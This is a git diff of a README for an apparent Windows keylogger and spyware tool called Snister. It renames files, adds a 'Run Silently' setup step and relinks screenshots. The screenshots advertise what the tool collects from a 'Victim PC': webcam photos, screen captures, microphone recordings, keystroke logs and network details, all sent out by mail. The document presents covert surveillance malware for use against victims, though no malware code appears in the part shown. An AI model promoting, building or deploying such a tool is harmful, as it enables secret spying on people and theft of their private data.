@@ -82,30 +82,39 @@ $ cd sinister
 # Installing dependencies
 $ python -m pip install -r windows_packages.txt
 
-# Open keylogger.py in Text editor and Configure Line 16 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe"
+# Open snister.py in Text editor and Configure Line 16 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe"
+# Run Silently Snister
+$
 ```
-## New Screenshots:
+## Screenshots:
 
 #### Getting report
+![Screenshot (85)](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/05dda37c-2234-4665-ac4f-00227ef4e02b)
+
 
 #### Victim Photo Mail
-![Victim Photo Mail](https://github.com/Er-Parag-Cyber/snister/assets/62016806/139e2165-0bce-4261-95a2-0751b86b4339)
+![Victim Photo Mail](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/a3ecc3f5-092f-4f2c-9158-70c8b43752ff)
+
 
 #### Screenshots Mail
-![SS Mail](https://github.com/Er-Parag-Cyber/snister/assets/62016806/0086c16c-887e-4c0d-a0a2-36b19393ba75)
+![SS Mail](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/350ece78-e1a4-4011-9f9b-70ed196fcf71)
+
 
 #### Mic Recording From Victim PC
-![Mic Recording](https://github.com/Er-Parag-Cyber/snister/assets/62016806/8f7ffcda-ae4c-4bb2-ad4a-0f1cc06c6b82)
+![Mic Recording](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/0e546132-f06a-4680-904b-33b7aad56212)
+
 
 #### Logs Output From Victim PC
-![Log Folders](https://github.com/Er-Parag-Cyber/snister/assets/62016806/8ab772ad-5826-4222-b7db-cad8fc8145a2)
-![Logs Output](https://github.com/Er-Parag-Cyber/snister/assets/62016806/3ea0fcfd-02d3-4a0b-b1c2-29ff3c460513)
+![Log Folders](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/aaa5268f-78e9-4261-a8eb-575650509131)
+![Logs Output](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/51fab0ec-6d18-43a7-8f05-bf665877e294)
+
 
 #### Net Information XML From Victim PC
-![Net Info Xml(1)](https://github.com/Er-Parag-Cyber/snister/assets/62016806/e185827d-3e44-4699-a954-aaa96f26b330)
+![Net Info Xml(1)](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/58a9bac0-9374-4c07-b7b9-fc3f5c4af9cb)
+
 
 #### Screenshots From Victim PC
-![SS](https://github.com/Er-Parag-Cyber/snister/assets/62016806/95f57dc1-5e2a-49ff-9ced-415388723456)
+![SS](https://github.com/Er-Parag-Cyber/Snister/assets/62016806/7279f268-7dc4-48c3-a803-64ed1e5ae2fb)
 
 
 
